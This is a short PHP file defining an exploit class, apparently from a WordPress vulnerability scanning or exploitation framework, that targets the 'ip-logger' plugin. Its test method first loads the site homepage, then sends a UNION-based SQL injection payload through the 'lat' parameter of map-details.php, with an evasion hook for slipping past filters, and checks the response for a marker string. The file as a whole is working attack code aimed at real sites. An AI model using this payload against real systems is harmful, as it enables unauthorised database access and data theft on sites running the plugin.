<?php
class IPLoggerExploit extends BaseExploit
{
	public $name="ip-logger";
	public function test()
	{
		//the plugin updates itself (including table structures) on wp_head hook,
		//so a visit to homepage is required for it to update before testing.
		$t=$this->curl($this->url());

		$res=$this->curl(self::$url."wp-content/plugins/ip-logger/map-details.php?lat=-1%20UNION{$this->evasion()}%20SELECT%20{$this->signatureMysql()},NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20&lon=-1&blocked=-1"
			);
		return strpos($res,$this->signature())!==false;
	}
} 